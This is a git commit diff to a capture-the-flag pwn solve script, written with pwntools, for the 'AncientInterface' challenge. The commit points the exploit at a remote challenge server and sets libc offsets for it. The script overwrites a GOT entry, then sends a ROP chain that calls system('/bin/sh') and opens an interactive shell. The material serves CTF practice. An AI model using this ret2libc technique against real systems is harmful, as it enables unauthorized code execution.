62ea4d6c060d4805d7f557c4fa7fe005cae35db8
ShundaZhang <zhangshunda@gmail.com>
2023-05-17 07:41:06 +0800

    Solving AncientInterface, the last step, online attack...

--- ctf/pwn/AncientInterface/challenge/dec.py
+++ ctf/pwn/AncientInterface/challenge/dec.py
@@ -3,14 +3,14 @@ from pwn import *
 context.log_level = 'debug'
 
 elf = ELF('./ancient_interface')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  #for local test
-#libc = ELF('./libc.so.6')  #remote, ubuntu 20.04
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  #for local test
+libc = ELF('./libc.so.6')  #remote, ubuntu 20.04
 
-#ip, port = '165.227.232.214',30666
-#io = remote(ip, port)
+ip, port = '178.62.3.111', 32625
+io = remote(ip, port)
 
 #io = process('./ancient_interface')
-io = gdb.debug('./ancient_interface')
+#io = gdb.debug('./ancient_interface')
 
 io.recvuntil('$')
 for i in range(16):
@@ -47,8 +47,8 @@ ROPgadget --binary ./libc.so.6 --string /bin/sh
 ret = p64(0x000000000040101a)
 pop_rdi = p64(0x0000000000401d43)
 
-str_bin = p64(libc_base + 0x00000000001d8698)    #local
-#str_bin = p64(libc_base + 0x00000000001b45bd)   #remote
+#str_bin = p64(libc_base + 0x00000000001d8698)    #local
+str_bin = p64(libc_base + 0x00000000001b45bd)   #remote
 
 #read_bytes | amnt | p | buf
 for i in range(16):
@@ -59,9 +59,9 @@ io.recv()
 for i in range(16):
         io.recvuntil('Alarm has been hit!')
 io.recv()
-#offset = 4096+8, target in 4096+8+8+8, first return read_bytes = 16+10, payload len = 32, so amt = 4096+8+8+8+32
-io.sendline(p32(4096+8-10)+p32(4096+8+8+8+32)+p64(elf.got['puts']-1)+'ABCDEFGHIJ')
+#offset = 4096+7, target in 4096+7+8+8, first return read_bytes = 16+10, payload len = 32, so amt = 4096+8+8+8+32
+io.sendline(p32(4096+7-10)+p32(4096+7+8+8+32)+p64(elf.got['puts']-1)+'ABCDEFGHIJ')
 payload = ret+pop_rdi+str_bin+p64(libc.sym['system'])
-#payload = 'A'*48  #debug
+#payload = 'A'*32  #debug
 io.sendline(payload)
 io.interactive()
